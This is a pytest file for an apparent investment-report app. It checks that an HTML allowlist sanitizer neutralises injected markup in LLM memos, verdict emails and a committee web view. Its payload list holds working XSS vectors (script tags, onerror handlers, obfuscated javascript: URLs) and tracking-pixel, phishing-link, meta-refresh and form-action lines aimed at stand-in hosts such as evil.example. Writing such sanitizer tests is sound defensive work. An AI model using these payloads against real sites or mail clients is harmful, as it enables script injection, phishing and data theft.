"""邮件 / 委员会 /view 渲染期 HTML 白名单（services/notifier.md_to_safe_html）。

LLM 备忘、新闻转述、异常文本都会拼进 markdown 再转 HTML。这里把一批注入样本走完整
路径（备忘 → 日报 builder → render_markdown_email；verdict 邮件；/view），再用解析器
逐个检查输出里的每个真标签/属性都在模板自用的白名单内。只用合成数据。
"""
from __future__ import annotations

import json
import subprocess
import sys
from dataclasses import dataclass
from html.parser import HTMLParser
from urllib.parse import urlsplit

import pytest

from openinvest.jobs.daily_report_builder import assemble_full_report
from openinvest.services import event_notifier
from openinvest.services.notifier import md_to_safe_html, render_markdown_email

PAYLOADS = [
    # 原生标签 / 属性
    '<img src="https://track.example/p.gif">',
    '<img src=x onerror="alert(1)">',
    '<IMG SRC=JaVaScRiPt:alert(1)>',
    '<svg/onload=alert(1)>',
    '<svg><script>alert(1)</script></svg>',
    '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
    '<script>alert(1)</script>',
    '<iframe src="https://evil.example" srcdoc="<p>x</p>"></iframe>',
    '<object data="https://evil.example/x.swf"></object><embed src="https://evil.example/e">',
    '<form action="https://evil.example"><input name=p><button formaction="https://evil.example">go</button></form>',
    '<meta http-equiv="refresh" content="0;url=https://evil.example">',
    '<base href="https://evil.example/">',
    '<link rel=stylesheet href="https://evil.example/x.css">',
    '<a href="https://evil.example/login" title="t">查看持仓</a>',
    '<a href="jav&#x61;script:alert(1)">x</a>',
    '<a href="  javascript:alert(1)">x</a>',
    '<p onclick="alert(1)" id="x" class="verdict-tile">x</p>',
    '<div class="verdict-tile"><div class="verdict-badge">SELL</div></div>',
    # CSS
    '<style>.analyst{display:none} @import url(https://evil.example/x.css);</style>',
    '<p style="position:fixed;top:0;background:url(https://evil.example/p.gif)">fake</p>',
    # 嵌套 / 残缺 / 编码技巧
    '<scr<script>ipt>alert(1)</script>',
    '<<img src=x onerror=alert(1)>>',
    '<img src=x onerror=alert(1)',
    '<!--><img src=x onerror=alert(1)>-->',
    '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
    '&lt;img src=x onerror=alert(1)&gt;',
    # markdown 链接 / 图片 / 自动链接 / 引用式链接 / 目录
    '[查看持仓](https://evil.example/login)',
    '[x](javascript:alert(1)) [y]( JaVaScRiPt:alert(1)) [z](data:text/html,<script>alert(1)</script>)',
    '![x](https://track.example/p.gif) ![y](data:image/png;base64,iVBORw0KGgo=)',
    '<https://evil.example/login> <someone@evil.example>',
    '[查看持仓][1]\n\n[1]: https://evil.example/login',
    '[x][2]\n\n[2]: javascript:alert(1)',
    '![x][3]\n\n[3]: https://track.example/p.gif',
    '[TOC]',
    # md_in_html 块：在分析师卡片里嵌 HTML 块 / 提前闭合卡片
    '<div markdown="1">\n\n<img src=x onerror=alert(1)>\n\n</div>',
    '</div>\n\n## 2. 伪造标题 **裁决**: SELL\n\n<div class="analyst" markdown="1">',
]

_OK_TAGS = {
    # 模板正文
    "p", "br", "hr", "h1", "h2", "h3", "h4", "h5", "h6", "strong", "em", "code", "pre",
    "blockquote", "ul", "ol", "li", "table", "thead", "tbody", "tr", "th", "td", "a", "div",
    # 邮件外壳
    "html", "head", "meta", "style", "body", "b",
}


class _Audit(HTMLParser):
    """列出所有不在白名单里的真标签 / 属性（文字里的 &lt;img 不算）。"""

    def __init__(self, hosts=()):
        super().__init__(convert_charrefs=True)
        self.bad: list[str] = []
        self.styles = 0
        self.hosts = set(hosts)

    def handle_starttag(self, tag, attrs):
        if tag not in _OK_TAGS:
            self.bad.append(tag)
        self.styles += tag == "style"
        for k, v in attrs:
            u = urlsplit(v or "")
            ok = (
                (tag, k) in {("meta", "charset"), ("ol", "start"), ("a", "rel")}
                # nh3 滤掉非白名单 class 后会留下空的 class=""，无害
                or (tag, k) == ("div", "class") and v in {"", "analyst", "container", "footer"}
                or k == "align" and tag in ("th", "td") and v in {"left", "center", "right"}
                or (tag, k) == ("a", "href") and u.scheme in ("http", "https")
                and u.hostname in self.hosts
            )
            if not ok:
                self.bad.append(f"{tag}[{k}={v}]")

    handle_startendtag = handle_starttag


def _violations(html: str, hosts=()) -> list[str]:
    a = _Audit(hosts)
    a.feed(html)
    if a.styles > 1:  # 只许外壳 <head> 里那一个 CSS
        a.bad.append(f"{a.styles} <style>")
    return a.bad


@dataclass
class _Report:
    cio_memo: str
    quant_view: str
    risk_view: str


def _daily_report(text: str) -> str:
    """把同一段不可信文本塞进日报里每个 LLM 字段，走 builder → 邮件渲染。"""
    md = assemble_full_report(
        today="2026-01-02", macro_view=text, gold_snapshot_text="g",
        friction_report="f", target_assets=[{"symbol": "AAA", "display_name": "Asset A"}],
        asset_committees={"AAA": {
            "verdict": {"verdict": "TRIM", "confidence": 0.5, "dominant_view": "risk",
                        "alloc_cny": -1, "reentry_price": 1.0,
                        "reentry_condition": text, "expected_path": text},
            "report": _Report(cio_memo=text, quant_view=text, risk_view=text),
        }},
        skipped_assets=set(), total_assets_cny=0.0, final_decision_gemini=text,
        plain_summaries={"AAA": text},
    )
    return render_markdown_email(md)


def test_render_terminates_on_corpus():
    """整份注入样本在子进程里渲染，必须限时返回。

    markdown 依赖 stdlib html.parser，两者版本组合不当时个别输入会让渲染不终止——
    那会卡死发邮件的调度 job。放在子进程里，回归时是快速失败而不是把 CI 挂到超时。
    放在参数化用例之前，先跑。
    """
    code = (
        "import json, sys\n"
        "from openinvest.services.notifier import render_markdown_email\n"
        "for p in json.loads(sys.stdin.read()):\n"
        "    render_markdown_email('x ' + p + ' y', footer_label='t')\n"
    )
    try:
        subprocess.run([sys.executable, "-c", code], input=json.dumps(PAYLOADS),
                       text=True, check=True, timeout=60)
    except subprocess.TimeoutExpired:
        pytest.fail("render_markdown_email 在注入样本上不终止（检查 markdown / Python 版本组合）")


@pytest.mark.parametrize("payload", PAYLOADS)
def test_daily_report_email_has_no_active_html(payload):
    out = _daily_report(payload)
    assert _violations(out) == []
    # 三张分析师卡片都还在（备忘里的 </div> 关不掉卡片）
    assert out.count('<div class="analyst">') == 3


@pytest.mark.parametrize("payload", PAYLOADS)
def test_allowlist_alone_neutralizes_payload(payload):
    """不依赖任何上游转义：白名单本身就是边界。"""
    wrapped = f'<div class="analyst" markdown="1">\n\n{payload}\n\n</div>\n\n## after'
    assert _violations(render_markdown_email(wrapped)) == []


def test_verdict_email_untrusted_fields_have_no_active_html(monkeypatch):
    sink: dict = {}
    monkeypatch.setattr(event_notifier, "send_discord_alert", lambda *a, **k: True)
    monkeypatch.setattr(event_notifier, "send_email_html",
                        lambda **k: sink.update(k) or "to@example.com")
    evil = "<img src=x onerror=alert(1)>[go](https://evil.example)![p](https://track.example/p.gif)"
    event_notifier.send_committee_verdict_email(
        task_id="t1", symbols=[f"A{evil}", "B"], event_ids=[evil],
        by_asset={f"A{evil}": {"verdict": {"verdict": f"SELL{evil}"}},
                  "B": {"error": evil}},
    )
    assert _violations(sink["html_body"]) == []
    assert "SELL" in sink["html_body"]


def test_event_alert_keeps_only_template_links():
    """事件预警的来源链接是模板拼的，白名单按本封邮件的来源 host 放行；正文里别的 host 不放。"""
    events = [{
        "one_line_claim": "x", "stance": "risk", "severity": "high", "ts": "t",
        "sources": [{"title": "src", "url": "https://news.example/a", "src_name": "n"}],
    }]
    md = event_notifier._build_markdown(
        events, committee_task_id="abc", api_base_url="https://hub.example:8765",
        holdings_snapshot={},
    ) + "\n\n[phish](https://evil.example/x) <a href='https://evil.example/y'>y</a>"
    hosts = event_notifier._link_hosts(events, "https://hub.example:8765")
    out = render_markdown_email(md, link_hosts=hosts)
    assert _violations(out, hosts) == []
    assert 'href="https://news.example/a"' in out
    assert 'href="https://hub.example:8765/api/committee/abc"' in out
    assert "evil.example" not in out


def test_template_structure_survives():
    """模板合法产出的结构都保留：卡片 / 表格对齐 / 有序列表起始号 / 代码块 / 引用 / 标题。"""
    md = (
        "# T\n\n## S\n\n### s\n\n**b** _i_ `c`\n\n> q\n\n---\n\n3. x\n4. y\n\n"
        "| a | b |\n|:-:|--:|\n| 1 | 2 |\n\n```\nk = 1\n```\n\n"
        '<div class="analyst" markdown="1">\n\n**粗体** 正文\n\n- 列表\n\n</div>\n'
    )
    out = md_to_safe_html(md)
    for frag in ("<h1>T</h1>", "<h2>S</h2>", "<h3>s</h3>", "<strong>b</strong>", "<em>i</em>",
                 "<code>c</code>", "<blockquote>", "<hr>", '<ol start="3">',
                 '<th align="center">a</th>', '<td align="right">2</td>',
                 "<pre><code>k = 1\n</code></pre>", '<div class="analyst">',
                 "<strong>粗体</strong>", "<li>列表</li>"):
        assert frag in out, frag


def test_llm_angle_brackets_render_as_text():
    """email 变体：LLM 正文里的 MA20<MA120 / <tool_call> 原样显示，不被当标签吞掉；
    chat 变体不转义（聊天平台不解析 HTML）。"""
    text = "MA20<MA120 空头排列，RSI 47 > 30 <tool_call>"
    out = _daily_report(text)
    assert "MA20&lt;MA120 空头排列，RSI 47 &gt; 30 &lt;tool_call&gt;" in out
    chat = assemble_full_report(
        today="d", macro_view=text, gold_snapshot_text="", friction_report="",
        target_assets=[], asset_committees={}, skipped_assets=set(),
        total_assets_cny=0.0, final_decision_gemini="", render_target="chat",
    )
    assert "MA20<MA120" in chat


def test_committee_view_sanitizes_transcript_but_keeps_charts(tmp_path, monkeypatch):
    import openinvest.connectors.state_bus as sb
    from openinvest.connectors.web_api.routers import committee as router

    monkeypatch.setattr(sb, "_COMMITTEE_DIR", tmp_path)
    monkeypatch.setattr(router, "COMMITTEE_DIR", tmp_path)
    from openinvest.services.committee_charts import render_verdict_tile

    verdict = {"verdict": "HOLD", "confidence": 0.6, "dominant_view": "risk", "alloc_cny": 0}
    sb.write_committee_status("vt", {
        "task_id": "vt", "status": "done", "started_at": "2026-01-02T08:00:00+08:00",
        "result": {"symbols": ["AAA"], "by_asset": {"AAA": {"verdict": verdict}}},
    })
    (tmp_path / "2026-01-02").mkdir()
    (tmp_path / "2026-01-02" / "AAA.md").write_text("\n\n".join(PAYLOADS), encoding="utf-8")

    r = router.committee_status_view("vt")
    head, rest = r.body.decode().split("</head>", 1)
    tile = render_verdict_tile(verdict)
    assert tile in rest                              # 可信卡片在白名单之后拼，原样保留
    assert "<style>" in head and "<style" not in rest  # CHART_CSS 进 <head>，正文无 style
    assert _violations(rest.replace(tile, "")) == []  # 其余（transcript 等）只剩白名单标签
    csp = r.headers["content-security-policy"]
    assert "img-src 'none'" in csp and "base-uri 'none'" in csp and "form-action 'none'" in csp
    assert r.headers["referrer-policy"] == "no-referrer"
    assert router.committee_status_view("missing").headers["content-security-policy"] == csp


def test_href_filter_fails_closed():
    """host 校验回调出错或 host 解读有歧义时一律不给链接（nh3 在回调抛异常时会保留原值）。"""
    hosts = {"hub.example"}
    md = ("[a](http://[hub.example/) [b](https://hub.example\\@evil.example/) "
          "[c](https://user@hub.example/) [ok](https://hub.example/x)")
    out = md_to_safe_html(md, link_hosts=hosts)
    assert out.count("href=") == 1 and 'href="https://hub.example/x"' in out


def test_comment_like_input_renders_in_bounded_time():
    """注释形输入不进 markdown 解析（模板不产出注释），渲染限时返回、与库版本无关。"""
    code = (
        "from openinvest.services.notifier import md_to_safe_html\n"
        "for s in ['text <!-->x', 'a <!-- b <!-- c', '<div>\\n\\n<!-->x-->\\n\\n</div>']:\n"
        "    md_to_safe_html(s)\n"
    )
    try:
        subprocess.run([sys.executable, "-c", code], check=True, timeout=30)
    except subprocess.TimeoutExpired:
        pytest.fail("注释形输入让渲染不终止")
